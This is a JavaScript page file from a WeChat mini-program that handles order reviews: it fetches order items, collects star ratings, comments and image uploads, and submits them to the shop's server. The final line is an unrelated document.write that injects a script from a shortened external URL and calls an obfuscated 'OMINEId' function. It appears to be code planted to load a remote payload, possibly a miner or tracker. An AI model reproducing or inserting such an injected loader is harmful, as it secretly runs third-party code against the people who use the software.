var t = getApp(),
  a = t.requirejs("core"), 
   $ = t.requirejs("jquery");
Page({
  data: {
    stars_class: ["fui-label-default", "fui-label-primary", "fui-label-success", "fui-label-warning", "fui-label-danger"],
    stars_text: ["差评", "一般", "挺好", "满意", "非常满意"],
    normalSrc: "/static/images/icon/favor.png",
    selectedSrc: "/static/images/icon-red/favor_fill.png",
    key: [4,4],
    comment: true,
    images: [],
    sendData:[],
    imgs: []
  },
  onLoad: function (a) {
    this.setData({
      options: a
    }),
      t.url(a);
    this.get_list({ is_comment: 1 ,order_sn:a.id})
  },
  get_list: function (addObject) {
    var _this = this;
    wx.showLoading({
      title: '加载中'
    });
    var datas = {};
    if (addObject) {
      datas = $.extend({
        session_token: t.globalData.session_token,
      }, addObject);
    } else {
      datas = {
        session_token: t.globalData.session_token,
        show_data: "orderDetail"
      };
    };
    wx.request({
      url: t.globalData.daxin + "/order/orderList",
      data: datas,
      method: "POST",
      success: function (res) {
        //console.log(res);
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.data.list) {
          var lists = res.data.data.list;
          if (res.data.data.list.length == 0) {
            _this.setData({
              empty: true,
              show: true
            });
            return;
          };
          var keys=[],sendDatas=[],imgUrl=[];
          $.each(lists, function (index, value) {
            value.statusstr = t.getOrderStatus(value).indexOf("(") > 0 ? t.getOrderStatus(value).split("(")[0] : t.getOrderStatus(value);
            if (t.getOrderStatus(value).indexOf("(") > 0) { value.ps = "true" };
            if (value.order_goods) {
              $.each(value.order_goods, function (ind, val) {
                keys.push(4);
                sendDatas.push({ p_id: val.p_id, star: 5, content: "", images:""});
                imgUrl.push([]);
                val.total = (val.p_price_true * val.p_num).toFixed(3);
                val.thumb = val.img ? t.globalData.daxinImg + val.img : "";
              });
            };
          });
          _this.setData({
            list: lists,
            key: !keys ? [] : keys,
            sendData: !sendDatas ? [] : sendDatas,
            images: !imgUrl ? [] : imgUrl,
            imgs: !imgUrl ? [] : imgUrl,
            show: true,
            loaded: true
          });
        } else {
          if (res.data.msg == "没有数据") {
            _this.setData({
              empty: true,
              show: true,
              list: []
            });
          } else {
            wx.showModal({
              title: '错误提示',
              content: res.data.msg + ',数据获取失败',
              showCancel: false,
              success: function () {
                if (res.confirm) {

                }
              }
            })
          }
        }

      }
    })
  },
  select: function (t) {
    var a = t.currentTarget.dataset.key;
    var index = t.currentTarget.dataset.index;
    var keys = this.data.key;
    var sendDatas = this.data.sendData;
    keys[index] = a;
    sendDatas[index].star = parseFloat(a) + 1;
    this.setData({
      key: keys,
      "sendData": sendDatas
    })
  },
  change: function (t) {
    var e = a.pdata(t).name,
        id = a.pdata(t).id,
        index = a.pdata(t).index,
        sendDatas = this.data.sendData;
    sendDatas[index][e] = t.detail.value,
    sendDatas[index].p_id = id,
    this.setData({
      sendData: sendDatas
    })
  },
  submit: function () {
    var _this = this;
    var iscomment = _this.data.comment;
    var images = _this.data.images;
    if (!iscomment)return;
    var sendData = _this.data.sendData;
    var notempty=true;
    for (var e = 0, i = sendData.length; e < i; e++) {
      // var s = {
      //   goodsid: this.data.goods[e].goodsid,
      //   level: this.data.key + 1,
      //   content: this.data.content,
      //   images: this.data.images
      // };
      // t.comments.push(s)
      $.each(sendData[e],function(ind,val){
        if (!val && val == "" && ind != "images" && ind!= "content"){
            notempty = false;
            return false;
          };
      });
    };
    $.each(sendData, function (ind, val) {
      val.images = images[ind].join(";");
    });
    if (!notempty){
      wx.showToast({
        title: '您还没有评论哟！！！',
        duration:1000
      })
      ;return};
    _this.setData({ comment: false });
    wx.showLoading({
      title: '提交中...'
    });
    var datas = {
      session_token: t.globalData.session_token,
      comment_arr:sendData,
      order_sn:_this.data.options.id
      };
    wx.request({
      url: t.globalData.daxin + "/customer/userComment",
      data: datas,
      method: "POST",
      success: function (res) {
        //console.log(res);
        _this.setData({ comment: true });
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "success") {
          wx.showToast({
            title: '评论成功',
            icon:"success",
            success:function(){
              setTimeout(function(){
                wx.navigateBack();
              },800);
            }
          })
        } else {
          if (res.data.msg == "没有数据") {
            _this.setData({
              empty: true,
              show: true,
              list: []
            });
          } else {
            wx.showModal({
              title: '错误提示',
              content: res.data.msg + ',评论失败',
              showCancel: false,
              success: function () {
                if (res.confirm) {

                }
              }
            })
          }
        }

      }
    })
  },
  upload: function (event) {
    var e = this,
      i = a.pdata(event),
      s = i.type,
      n = e.data.images,
      o = e.data.imgs,
      r = i.index;
    "image" == s ? a.upload(function (imgUrl) {
      var showt = t.globalData.uploadimg + imgUrl;      
        n[i.pindex].push(imgUrl),
        o[i.pindex].push(showt),
        e.setData({
          images: n,
          imgs: o
        })
    }) : "image-remove" == s ? (n[i.pindex].splice(r, 1), o[i.pindex].splice(r, 1), e.setData({
      images: n,
      imgs: o
    })) : "image-preview" == s && wx.previewImage({
      current: o[i.pindex][r],
      urls: o[i.pindex]
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
